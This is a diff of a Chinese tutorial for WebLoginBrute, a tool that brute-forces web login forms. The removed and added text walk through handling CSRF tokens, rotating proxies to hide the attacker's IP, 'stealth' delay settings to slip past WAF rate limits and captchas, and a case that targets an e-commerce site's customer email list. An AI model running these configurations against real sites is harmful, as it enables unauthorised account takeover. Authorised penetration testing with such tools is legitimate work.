@@ -1,382 +1,108 @@
-# 使用教程
+# 实战教程
 
-本教程将指导您完成WebLoginBrute的实际使用过程，包含多个真实场景的案例。
+本教程将通过一个完整的实战案例，指导您如何分析目标、配置 WebLoginBrute 并成功执行一次登录爆破。
 
-## 📚 教程目录
+## 场景设定
 
-- [基础教程](#基础教程)
-- [高级技巧](#高级技巧)
-- [实战案例](#实战案例)
-- [最佳实践](#最佳实践)
+我们的目标是一个模拟的登录页面。这个页面具有以下特点，这也是在真实世界中非常常见的设计：
 
-## 🎯 基础教程
+1.  它受 **CSRF (跨站请求伪造)** 保护，意味着每次提交表单都需要一个动态生成的、唯一的 `csrf_token`。
+2.  除了用户名和密码，它还需要一个**隐藏的表单字段** `login_type`，其值必须为 `standard`。
 
-### 教程1：快速开始
+不正确处理以上任何一点，都会导致登录失败。
 
-#### 目标
-在5分钟内完成第一次CSRF爆破测试。
+## 步骤 1: 侦察目标
 
-#### 步骤
+在运行工具之前，第一步永远是手动分析。
 
-1. **准备环境**
-```bash
-# 克隆项目
-git clone https://github.com/RedteamNotes/WebLoginBrute.git
-cd WebLoginBrute
+1.  用浏览器打开目标登录页面。
+2.  按 F12 打开开发者工具，选择 "Elements" (元素) 或 "Inspector" (检查器) 标签页。
+3.  找到 `<form>` 标签，并分析其内容。
 
-# 安装依赖
-pip3 install -r requirements.txt
+假设我们看到了以下 HTML 代码：
+```html
+<form action="/auth/login" method="POST">
+    <input type="text" name="username_field">
+    <input type="password" name="password_field">
+    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6a1b2c3d4e5f6">
+    <input type="hidden" name="login_type" value="standard">
+    <button type="submit">Log In</button>
+</form>
 ```
 
-2. **创建测试字典**
-```bash
-# 创建简单的测试字典
-echo "admin" > users.txt
-echo "password" > passwords.txt
-echo "admin123" >> passwords.txt
-echo "123456" >> passwords.txt
-```
+从这段代码中，我们可以获得所有必需的信息：
+-   **提交 URL (Action)**: `/auth/login`。如果表单的 `action` 属性为空，则提交 URL 通常就是当前页面的 URL。
+-   **CSRF Token 字段名**: `csrf_token`。
+-   **额外字段**: 需要一个名为 `login_type`，值为 `standard` 的字段。
 
-3. **配置目标**
+## 步骤 2: 初次尝试 (并分析失败)
+
+现在，让我们创建一个基础的 `config.yaml`，故意忽略掉 CSRF 和额外字段，看看会发生什么。
+
+**`config.yaml`:**
 ```yaml
-# config.yaml
-url: "https://test.example.com/login"
-success_redirect: "https://test.example.com/dashboard"
-failure_redirect: "https://test.example.com/login"
+url: "https://your-target.com/login"
+action: "https://your-target.com/auth/login"
 users: "users.txt"
 passwords: "passwords.txt"
 threads: 5
-aggressive: 0  # 快速模式
 ```
 
-4. **运行测试**
+**运行:**
 ```bash
 webloginbrute --config config.yaml --verbose
 ```
 
-#### 预期结果
-```
-[INFO] 对抗级别: 0 - 快速模式
-[INFO] 开始爆破任务...
-[INFO] 尝试登录：admin:password
-[INFO] 尝试登录：admin:admin123
-[SUCCESS] 发现有效凭据: admin:123456
-```
+**预期结果**: 所有尝试都会失败。在 `--verbose` 输出中，你可能会看到服务器返回了错误（如 403 Forbidden 或 419 Page Expired），或者被重定向回登录页，提示 "无效的 CSRF Token"。这验证了我们的侦察结果：CSRF 保护是有效的。
 
-### 教程2：配置分析
+## 步骤 3: 修正配置
 
-#### 目标
-学会分析目标网站的登录机制。
+现在，我们将侦察到的所有信息都添加到 `config.yaml` 中。
 
-#### 步骤
-
-1. **手动分析登录页面**
-```bash
-# 使用浏览器访问登录页面
-curl -s "https://target.com/login" | grep -i "csrf\|token"
-```
-
-2. **识别关键元素**
-```html
-<!-- 查找CSRF Token -->
-<input type="hidden" name="_token" value="abc123...">
-
-<!-- 查找表单字段 -->
-<form action="/login" method="POST">
-  <input name="username" type="text">
-  <input name="password" type="password">
-  <input name="_token" type="hidden" value="...">
-</form>
-```
-
-3. **确定配置参数**
+**`config.yaml` (修正后):**
 ```yaml
-url: "https://target.com/login"           # 登录页面
-success_redirect: "https://target.com/dashboard" # 成功页面
-failure_redirect: "https://target.com/login"     # 失败页面
-```
-
-## 🔧 高级技巧
-
-### 技巧1：代理使用
-
-#### 场景
-目标有IP限制或需要隐藏真实IP。
-
-#### 配置
-```yaml
-# 使用HTTP代理
-proxy: "http://127.0.0.1:8080"
-
-# 使用SOCKS5代理
-proxy: "socks5://127.0.0.1:1080"
-
-# 使用认证代理
-proxy: "http://user:pass@proxy.example.com:8080"
-```
-
-#### 代理轮换
-```bash
-# 创建代理列表
-cat > proxy_list.txt << EOF
-http://proxy1.example.com:8080
-http://proxy2.example.com:8080
-http://proxy3.example.com:8080
-EOF
-
-# 使用脚本轮换代理
-while read proxy; do
-    sed -i "s|proxy:.*|proxy: \"$proxy\"|" config.yaml
-    webloginbrute --config config.yaml --verbose
-done < proxy_list.txt
-```
-
-### 技巧2：字典优化
-
-#### 场景
-提高爆破效率和成功率。
-
-#### 字典生成
-```bash
-# 使用常见用户名
-cat > users.txt << EOF
-admin
-administrator
-root
-user
-test
-guest
-EOF
-
-# 使用常见密码
-cat > passwords.txt << EOF
-password
-123456
-admin
-admin123
-password123
-qwerty
-EOF
-
-# 使用社工字典
-# 根据目标信息生成个性化字典
-```
-
-#### 字典分割
-```bash
-# 分割大字典文件
-split -l 1000 passwords.txt passwords_part_
-
-# 并行处理多个字典
-for file in passwords_part_*; do
-    sed -i "s|passwords:.*|passwords: \"$file\"|" config.yaml
-    webloginbrute --config config.yaml --verbose &
-done
-```
-
-### 技巧3：会话管理
-
-#### 场景
-目标有会话限制或需要保持登录状态。
-
-#### 配置
-```yaml
-# 启用会话池
-aggressive: 2
-enable_session_pool: true
-session_lifetime: 300
-
-# 自定义会话参数
-session_lifetime: 600  # 10分钟会话
-```
-
-#### 会话恢复
-```bash
-# 保存成功会话
-webloginbrute --config config.yaml --save-session
-
-# 恢复会话继续测试
-webloginbrute --config config.yaml --resume-session
-```
-
-## 🎯 实战案例
-
-### 案例1：企业网站测试
-
-#### 背景
-某企业网站需要安全评估，已知有基础WAF防护。
-
-#### 配置策略
-```yaml
-# 第一阶段：快速扫描
-url: "https://company.com/login"
-success_redirect: "https://company.com/dashboard"
-failure_redirect: "https://company.com/login"
-users: "common_users.txt"
-passwords: "top_1000_passwords.txt"
-threads: 10
-aggressive: 0  # 快速模式
-
-# 第二阶段：深度测试
-aggressive: 2  # 中对抗模式
+url: "https://your-target.com/login"
+action: "https://your-target.com/auth/login"
+users: "users.txt"
+passwords: "passwords.txt"
 threads: 5
-proxy: "http://proxy.company.com:8080"
-enable_session_pool: true
+
+# 从侦察中添加的关键参数
+csrf: "csrf_token"
+login_field: "login_type"
+login_value: "standard"
 ```
 
-#### 执行步骤
+## 步骤 4: 成功爆破
+
+使用修正后的配置再次运行工具。
+
+**运行:**
 ```bash
-# 1. 快速扫描
-webloginbrute --config config_quick.yaml --verbose
-
-# 2. 分析结果，调整策略
-# 如果发现频率限制，降低级别
-
-# 3. 深度测试
-webloginbrute --config config_deep.yaml --verbose
+webloginbrute --config config.yaml
 ```
 
-### 案例2：电商平台测试
+**预期结果**: WebLoginBrute 现在会在每次尝试前，自动从登录页面获取最新的 `csrf_token`，并将其与 `login_type` 字段一同提交。如果你的字典中存在正确的凭证，这次你应该能看到登录成功的提示。
 
-#### 背景
-电商平台有高级WAF和验证码防护。
+## 高级策略
 
-#### 配置策略
+### 应对速率限制 (WAF)
+如果在爆破过程中，你开始收到大量连接错误，或者所有尝试突然开始失败，这很可能是因为你的 IP 被 WAF (Web 应用防火墙) 限速或封禁了。
+
+**解决方案**: 调整配置，降低请求速率。
 ```yaml
-# 高对抗配置
-url: "https://shop.example.com/login"
-success_redirect: "https://shop.example.com/account"
-failure_redirect: "https://shop.example.com/login"
-users: "customer_emails.txt"
-passwords: "common_passwords.txt"
-threads: 3
-aggressive: 3  # 高对抗模式
-proxy: "http://rotating-proxy.com:8080"
-min_delay: 3.0
-max_delay: 15.0
-enable_captcha_detection: true
+# config.yaml
+threads: 3          # 减少并发
+aggressive: 2       # 提高对抗级别，增加请求间的随机延迟
+timeout: 45         # 适当增加超时以应对服务器慢响应
 ```
+然后使用 `--resume` 参数继续任务。
 
-#### 执行策略
+### 使用预设 Cookie
+某些网站要求在登录前必须有一个有效的会话 Cookie。你可以先用浏览器访问一次网站，然后将浏览器中的 Cookie 导出为 Netscape 格式的 `cookies.txt` 文件。
+
+**解决方案**: 使用 `--cookie` 参数加载该文件。
 ```bash
-# 1. 小规模测试
-head -100 customer_emails.txt > test_users.txt
-webloginbrute --config config_test.yaml --verbose
-
-# 2. 监控检测情况
-# 如果验证码频繁出现，增加延迟
-
-# 3. 大规模测试
-webloginbrute --config config_full.yaml --verbose
+webloginbrute --config config.yaml --cookie /path/to/cookies.txt
 ```
-
-### 案例3：内部系统测试
-
-#### 背景
-内部测试环境，无防护限制。
-
-#### 配置策略
-```yaml
-# 全速配置
-url: "http://internal.test.com/login"
-success_redirect: "http://internal.test.com/dashboard"
-failure_redirect: "http://internal.test.com/login"
-users: "internal_users.txt"
-passwords: "internal_passwords.txt"
-threads: 20
-aggressive: 0  # 全速模式
-enable_smart_delay: false
-enable_session_pool: false
-```
-
-#### 执行步骤
-```bash
-# 1. 快速爆破
-webloginbrute --config config_fast.yaml --verbose
-
-# 2. 分析结果
-# 检查成功凭据和失败模式
-
-# 3. 生成报告
-python3 generate_report.py --results bruteforce_results.json
-```
-
-## 🛠️ 最佳实践
-
-### 1. 目标分析
-
-#### 信息收集
-```bash
-# 1. 分析登录页面
-curl -s "https://target.com/login" > login_page.html
-
-# 2. 查找CSRF Token
-grep -i "csrf\|token" login_page.html
-
-# 3. 分析表单结构
-grep -A 10 -B 5 "form" login_page.html
-
-# 4. 测试登录流程
-curl -X POST "https://target.com/login" \
-  -d "username=test&password=test&_token=abc123" \
-  -w
-```
-
-#### 防护检测
-```bash
-# 1. 检测WAF
-curl -H "User-Agent: sqlmap" "https://target.com/login"
-
-# 2. 检测频率限制
-for i in {1..10}; do
-  curl "https://target.com/login"
-  sleep 1
-done
-
-# 3. 检测验证码
-curl -s "https://target.com/login" | grep -i "captcha"
-```
-
-### 2. 配置优化
-
-#### 性能优化
-```yaml
-# 高性能配置
-threads: 20                    # 高并发
-aggressive: 0         # 无延迟
-enable_smart_delay: false      # 关闭智能延迟
-enable_session_pool: false     # 关闭会话池
-```
-
-#### 隐蔽性优化
-```yaml
-# 高隐蔽配置
-threads: 3                     # 低并发
-aggressive: 3         # 高对抗
-proxy: "http://proxy.com:8080" # 使用代理
-min_delay: 5.0                 # 长延迟
-max_delay: 20.0                # 更长延迟
-```
-
-### 3. 监控和调整
-
-#### 实时监控
-```bash
-# 监控输出
-webloginbrute --config config.yaml 2>&1 | tee attack.log
-
-# 分析日志
-grep "SUCCESS" attack.log
-grep "rate limit" attack.log
-grep "captcha" attack.log
-```
-
-#### 动态调整
-```bash
-# 根据检测情况调整配置
-if grep -q "rate limit" attack.log; then
-    # 降低级别
-    sed -i 's/aggressive: 2/aggressive: 3/' config.yaml
-    sed -i 's/threads: 10/threads: 5/' config.yaml
-fi
-```
+程序会在所有请求中带上这些 Cookie。
